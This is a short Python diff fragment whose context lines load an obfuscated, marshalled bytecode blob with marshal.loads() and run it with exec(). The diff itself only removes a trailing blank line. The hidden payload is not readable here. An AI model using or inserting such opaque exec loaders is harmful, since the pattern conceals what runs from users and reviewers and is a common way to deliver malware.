@@ -5,4 +5,3 @@ obfuscated_code = b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
  
 loaded_code = marshal.loads(obfuscated_code)
 exec(loaded_code)
- 
